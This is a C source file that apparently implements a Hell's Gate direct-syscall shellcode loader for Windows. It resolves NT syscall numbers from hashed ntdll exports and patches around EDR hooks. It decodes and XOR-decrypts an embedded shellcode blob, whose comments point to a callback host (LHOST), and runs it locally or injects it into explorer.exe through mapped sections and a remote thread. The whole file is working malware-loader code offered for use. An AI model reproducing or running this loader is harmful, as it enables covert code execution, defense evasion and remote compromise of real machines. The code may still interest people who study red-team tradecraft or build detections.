#pragma once
#include <Windows.h>
#include <string.h>
#include "structs.h"
#include "base64.h"
#include <stdio.h>
#include <tlhelp32.h>


#define InitializeObjectAttributes(p, n, a, r, s) \
{ \
	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
	(p)->RootDirectory = r; \
	(p)->Attributes = a; \
	(p)->ObjectName = n; \
	(p)->SecurityDescriptor = s; \
	(p)->SecurityQualityOfService = NULL; \
}


/*--------------------------------------------------------------------
  VX Tables
--------------------------------------------------------------------*/
typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
	VX_TABLE_ENTRY NtOpenProcess;
	VX_TABLE_ENTRY NtCreateSection;
	VX_TABLE_ENTRY NtMapViewOfSection;
} VX_TABLE, * PVX_TABLE;

/*--------------------------------------------------------------------
  Function prototypes.
--------------------------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);
BOOL GetVxTableEntry(
	_In_ PVOID pModuleBase,
	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
	_In_ PVX_TABLE_ENTRY pVxTableEntry
);
BOOL Payload(
	_In_ PVX_TABLE pVxTable
);
PVOID VxMoveMemory(
	_Inout_ PVOID dest,
	_In_    const PVOID src,
	_In_    SIZE_T len
);

/*--------------------------------------------------------------------
  External functions' prototype.
--------------------------------------------------------------------*/
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();


DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	DWORD64 currentHash;
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);
	WORD gSystemCall;

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		currentHash = djb2(pczFunctionName);
		//printf("Functions: %s - 0x%p\n", pczFunctionName, currentHash);

		if (currentHash == pVxTableEntry->dwHash) {
			//printf("%s - 0x%p\n", pczFunctionName, currentHash);
			//printf("Function address: 0x%p\n", (PBYTE)pFunctionAddress);
			pVxTableEntry->pAddress = pFunctionAddress;

			
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05) {
					printf("[*]%s is potentially hooked!\n", pczFunctionName);
					
					// Quick and dirty fix in case the function has been hooked
					// Solo miro la syscall anterior. TODO: bucle para buscar en N anteriores
					if (*((PBYTE)pFunctionAddress - 32) == 0x4c
						&& *((PBYTE)pFunctionAddress + 1 - 32) == 0x8b
						&& *((PBYTE)pFunctionAddress + 2 - 32) == 0xd1
						&& *((PBYTE)pFunctionAddress + 3 - 32) == 0xb8
						&& *((PBYTE)pFunctionAddress + 6 - 32) == 0x00
						&& *((PBYTE)pFunctionAddress + 7 - 32) == 0x00) {
						BYTE high = *((PBYTE)pFunctionAddress + 5 -32);
						BYTE low = *((PBYTE)pFunctionAddress + 4 - 32);
						gSystemCall = (high << 8) | low;
						gSystemCall = gSystemCall + 1;
						printf("[*]Calculating the right systemcall ID: 0x%x\n", gSystemCall);
						pVxTableEntry->wSystemCall = gSystemCall;
						break;
					}
					else {
						printf("[!]Previous function is also potentially hooked. TODO\n");
					}
					
					return FALSE;
				}

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3) {
					return FALSE;
					printf("Return false2");
				}

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}


DWORD GetProcessByName(const wchar_t* name)
{
	DWORD pid = 0;

	// Create toolhelp snapshot.
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);


	// Walkthrough all processes.
	if (Process32First(snapshot, &process))
	{
		do
		{
			if (!wcscmp(process.szExeFile, name)) {
				pid = process.th32ProcessID;
				break;
			}
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);

	if (pid != 0)
	{
		return pid;
	}

	// Not found


	return 0;
}


/***************************************/
/* Experimenting with Process Injection*/
/***************************************/
BOOL Inject(PVX_TABLE pVxTable,  const char* processname) {
	//char* shellcode;
	NTSTATUS status;
	HANDLE targetHandle, sectionHandle;
	PVOID localSectionAddress = NULL;
	PVOID remoteSectionAddress = NULL;



	// LHOST=192.168.1.166
	// Lengh 667
	char shellcode[667] = "";
	char* encoded = "rz3z14K7/2NyMzVwEiUiYjpi4TUXe/9zMz37YWobuDFSfkXoG3rHeTgbuBEie0Xh/0kRT3B/EyKz+nlgUrSS3iAbuDFSuDYdEiQ4MqI1shtqOHYu1gdwM3LYs+tyM3Rp1rUEVDpS4+g6KyRl2DVQenOD0DU6zL1g2EH4fkOae2Kke0Xh/zSx+n8SMqJK0wHQH3Y8F3oWCrIH6yxl2DVUenODVSL5Pzxl2DVsenODcuh2uzwggzQocioNajkzazV4Ei84sJ5zcjGN0yxgCi84uGC6eJyNzClpYq4jeswkWg0bXRFVUzQme/uyeqSwfwMHVIqlYCEbuoIhaTkQkzhB+iEAetlIZQ2GU3VwM42G221yM3QQakdeAkRrHVJcAkIXUy84urMa9KPJMnQhHkS5YCE5MDA7iSOozLNwM3JTzLaaQnQhU1pBRENjQSgqdh5JPxYoAkM3YzweeSRWOiw3HkVnWhcgRztlIy0GACAEV1IlfjlCKgEhSjwdBSw5XS57PzwAeRsqYg8QSx5COUIFCwM2XTkCUjZzA0RCAR4XazwqXRpIakUqZRkrAgwiAjxnEkdHQEpTe+qzYC5gCzhB+iEbi2NAm/AhU3VwYyEAeqSw2CEPaIqle/uVWWkte/3QOWoqYRrTAGNyev3BOXExajvpRiXstXQhU3WP5j9i8zAoe/3QHkS5fkOaYDA79LYMVW0LzKfW8xZte7Pg22ZwMzvpd5NH03QhU3WP5jqs/Bdw2N7JBnVwMyEKWSMoev3wkpdgerWTM3NyMz2bC9Ej1nJTM2ON5jyyACY4upUbupI6uq5olLVwE3JTeuqLes4zxfySM3JTM5yne/flc/CwR8A1uGQ6MrekkwCia7ELWWMriJQ8eX8xuqis5g==";


	printf("[+] Decoding b64 payload...\n");
	int result = Base64decode((char*)shellcode, encoded);


	printf("[+] Decrypting shellcode...\n");
	unsigned char key[] = "Sup3rS3cr3t!";
	for (int i = 0; i < sizeof(shellcode); i++) {
		shellcode[i] = shellcode[i] ^ key[i % (sizeof(key) - 1)];
	}

	//Create section in local process (NtCreateSection)
	SIZE_T size = sizeof(shellcode);

	LARGE_INTEGER sectionSize ={ size };
	printf("[+] Calling syscall 0x%04X instead of NtCreateSection\n", pVxTable->NtCreateSection.wSystemCall);
	HellsGate(pVxTable->NtCreateSection.wSystemCall);
	status = HellDescent(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (status != 0x0) {
		printf("[-] Failed to create local section\n");
		return 0x1;
	}
	void* SectionPtr = &sectionHandle; //watch here
	printf("[*] Section created at 0x%p...\n", &sectionHandle);

	//Map section to local process as RW (NtMapViewOfSection)
	printf("[+] Calling syscall 0x%04X instead of NtMapViewOfSection\n", pVxTable->NtMapViewOfSection.wSystemCall);
	HANDLE currentHandle = (HANDLE)-1; //watch here
	HellsGate(pVxTable->NtMapViewOfSection.wSystemCall);
	status = HellDescent(sectionHandle, (HANDLE)-1, &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);

	if (status != 0x0) {
		printf("[-] Failed mapping section to local process\n");
		return 0x1;
	}
	void* LocalSectionAddresPtr = localSectionAddress; //watch here
	printf("[*] Section mapped to local process at 0x%p...\n", localSectionAddress);




	//Copy shellcode to local mapped section
	memcpy(localSectionAddress, shellcode, sizeof(shellcode));
	printf("[+] Shellcode allocated at 0x%p...\n", localSectionAddress);

	/*
	for (int i = 0; i < sizeof(shellcode)-1; i++) {
		printf("\\x%02x", *((byte *)localSectionAddress+i) & 0xff);
	}
	printf("\n");
	*/


	/*
	const wchar_t*  pname = L"explorer.exe";
	printf("[+] Lengh of pname:       %d\n", sizeof(pname));
	printf("[+] Lengh of processname: %d\n", sizeof(processname));
	
	if (pname == processname) {
		printf("[+] pname y processname son iguales\n");
	}
	*/

	//processname es char*, y no vale. Se incluye el nombre hardcodeado
	wchar_t* pname = L"explorer.exe";

	int pid = GetProcessByName(pname);
	printf("[+] Found PID of %ls: %d\n", pname, pid);

	//Open victim process (NtOpenProcess)
	OBJECT_ATTRIBUTES objAttr;
	CLIENT_ID cID;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	cID.UniqueProcess = pid;
	cID.UniqueThread = 0;
	printf("[+] Calling syscall 0x%04X instead of NtOpenProcess\n", pVxTable->NtOpenProcess.wSystemCall);
	HellsGate(pVxTable->NtOpenProcess.wSystemCall);
	status = HellDescent(&targetHandle, PROCESS_ALL_ACCESS, &objAttr, &cID);
	if (!targetHandle) {
		printf("[-] Failed to open process\n");
		return 0x1;
	}
	printf("[*] Remote process %d is now open\n", pid);

	
	//Map section to remote process as RX (NtMapViewOfSection)
	printf("[+] Calling syscall 0x%04X instead of NtMapViewOfSection\n", pVxTable->NtMapViewOfSection.wSystemCall);
	HellsGate(pVxTable->NtMapViewOfSection.wSystemCall);
	status = HellDescent(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);

	if (status != 0x0) {
		printf("[-] Failed mapping section to remote process\n");
		return 0x1;
	}
	printf("[*] Section mapped to remote process at 0x%p...\n", remoteSectionAddress);


	//Create a Thread to execute the shellcode (NtCreateThreadEx)
	HANDLE targetThreadHandle = NULL;
	printf("[+] Calling syscall 0x%04X instead of NtCreateThreadEx\n", pVxTable->NtCreateThreadEx.wSystemCall);
	HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
	status = HellDescent(&targetThreadHandle, 0x1FFFFF, NULL, targetHandle, (LPTHREAD_START_ROUTINE)remoteSectionAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
	if (status != 0x0) {
		printf("[-] Failed creating a thread\n");
		return 0x1;
	}
	printf("[*] Thread executed successfully\n");


	return TRUE;

}
/***************************************/
/***** End of Process Injection ********/
/***************************************/





BOOL Payload(PVX_TABLE pVxTable) {
	NTSTATUS status = 0x00000000;


	// LHOST=192.168.1.166
	// Lengh 667
	char shellcode[667] = "";
	char* encoded = "rz3z14K7/2NyMzVwEiUiYjpi4TUXe/9zMz37YWobuDFSfkXoG3rHeTgbuBEie0Xh/0kRT3B/EyKz+nlgUrSS3iAbuDFSuDYdEiQ4MqI1shtqOHYu1gdwM3LYs+tyM3Rp1rUEVDpS4+g6KyRl2DVQenOD0DU6zL1g2EH4fkOae2Kke0Xh/zSx+n8SMqJK0wHQH3Y8F3oWCrIH6yxl2DVUenODVSL5Pzxl2DVsenODcuh2uzwggzQocioNajkzazV4Ei84sJ5zcjGN0yxgCi84uGC6eJyNzClpYq4jeswkWg0bXRFVUzQme/uyeqSwfwMHVIqlYCEbuoIhaTkQkzhB+iEAetlIZQ2GU3VwM42G221yM3QQakdeAkRrHVJcAkIXUy84urMa9KPJMnQhHkS5YCE5MDA7iSOozLNwM3JTzLaaQnQhU1pBRENjQSgqdh5JPxYoAkM3YzweeSRWOiw3HkVnWhcgRztlIy0GACAEV1IlfjlCKgEhSjwdBSw5XS57PzwAeRsqYg8QSx5COUIFCwM2XTkCUjZzA0RCAR4XazwqXRpIakUqZRkrAgwiAjxnEkdHQEpTe+qzYC5gCzhB+iEbi2NAm/AhU3VwYyEAeqSw2CEPaIqle/uVWWkte/3QOWoqYRrTAGNyev3BOXExajvpRiXstXQhU3WP5j9i8zAoe/3QHkS5fkOaYDA79LYMVW0LzKfW8xZte7Pg22ZwMzvpd5NH03QhU3WP5jqs/Bdw2N7JBnVwMyEKWSMoev3wkpdgerWTM3NyMz2bC9Ej1nJTM2ON5jyyACY4upUbupI6uq5olLVwE3JTeuqLes4zxfySM3JTM5yne/flc/CwR8A1uGQ6MrekkwCia7ELWWMriJQ8eX8xuqis5g==";

//unsigned char encrypted[]="";

	printf("[+] Decoding b64 payload...\n");
	int result = Base64decode((char*)shellcode, encoded);
	/*
	for (int i = 0; i < sizeof(shellcode); i++) {
		printf("\\x%02x", shellcode[i] & 0xff);
	}
	*/

	printf("[+] Decrypting shellcode...\n");
	unsigned char key[] = "Sup3rS3cr3t!";
	for (int i = 0; i < sizeof(shellcode); i++) {
		shellcode[i] = shellcode[i] ^ key[i % (sizeof(key) - 1)];
		//printf("\\x%02x", shellcode[i] & 0xff);

	}


	// Allocate memory for the shellcode
	printf("[+] Allocating memory...\n");
	PVOID lpAddress = NULL;
	SIZE_T sDataSize = sizeof(shellcode);
	HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);

	// Write Memory
	printf("[+] Injecting the shellcode...\n");
	VxMoveMemory(lpAddress, shellcode, sizeof(shellcode));

	// Change page permissions
	printf("[+] Setting RX permissions to allocated memory...\n");
	ULONG ulOldProtect = 0;
	HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

	// Create thread
	printf("[+] Executing shellcode as a new thread...\n");
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
	status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	// Wait for 1 seconds
	LARGE_INTEGER Timeout;
	//Timeout.QuadPart = -100000000;
	Timeout.QuadPart = 9223372036854775807;
	HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);
	//status = HellDescent(hHostThread, FALSE, &Timeout);
	status = HellDescent(hHostThread, FALSE, &Timeout);

	return TRUE;
}

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}

int main(int argc, const char* argv[]) {
	const char* processname = L"";

	if (argc > 1) {
		processname = argv[1];
	}
	/*
	if (argc > 2) {
		pid = atoi(argv[2]);
	}
	*/
	//int pid = 3628;
	//DWORD64 currentHash=0;
	char* functionName;

	//Validate we have a pointer to TIB and PEB, as well as Windows 10 (OSMajorVersion 0xA)
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return 0x1;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;


	VX_TABLE Table = { 0 };

	functionName = "NtAllocateVirtualMemory";
	Table.NtAllocateVirtualMemory.dwHash = djb2(functionName);
	//printf("[+] Calculating hash... %s - 0x%llx\n", functionName, Table.NtAllocateVirtualMemory.dwHash);


	//Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory)) {
		printf("[-] Something goes wrong...");
		return 0x1;
	}


	functionName = "NtCreateThreadEx";
	Table.NtCreateThreadEx.dwHash = djb2(functionName);
	//printf("[+] Calculating hash... %s - 0x%llx\n", functionName, Table.NtCreateThreadEx.dwHash);
	//Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
		return 0x1;


	functionName = "NtProtectVirtualMemory";
	Table.NtProtectVirtualMemory.dwHash = djb2(functionName);
	//printf("[+] Calculating hash... %s - 0x%llx\n", functionName, Table.NtProtectVirtualMemory.dwHash);
	//Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
		return 0x1;


	functionName = "NtWaitForSingleObject";
	Table.NtWaitForSingleObject.dwHash = djb2(functionName);
	//printf("[+] Calculating hash... %s - 0x%llx\n", functionName, Table.NtWaitForSingleObject.dwHash);
	//Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
		return 0x1;

	functionName = "NtOpenProcess";
	Table.NtOpenProcess.dwHash = djb2(functionName);
	//printf("[+] Calculating hash... %s - 0x%llx\n", functionName, Table.NtOpenProcess.dwHash);
	//Table.NtOpenProcess.dwHash = 0x718CCA1F5291F6E7;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtOpenProcess))
		return 0x1;

	functionName = "NtCreateSection";
	Table.NtCreateSection.dwHash = djb2(functionName);
	//printf("[+] Calculating hash... %s - 0x%llx\n", functionName, Table.NtCreateSection.dwHash);
	//Table.NtCreateSection.dwHash = 0xF38A8F71AF24371F;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateSection))
		return 0x1;

	functionName = "NtMapViewOfSection";
	Table.NtMapViewOfSection.dwHash = djb2(functionName);
	//printf("[+] Calculating hash... %s - 0x%llx\n", functionName, Table.NtMapViewOfSection.dwHash);
	//Table.NtMapViewOfSection.dwHash = 0xF037C7B73290C159;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtMapViewOfSection))
		return 0x1;



	//Injecting shellcode in other process
	if (argc > 1) {
		printf("[+] Performing attack (remote thread). Injecting into %s\n",processname);
		Inject(&Table, processname);
	}
	else {
		printf("[+]Performing attack (local thread)\n");
		Payload(&Table);
	}
	return 0x00;
}

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}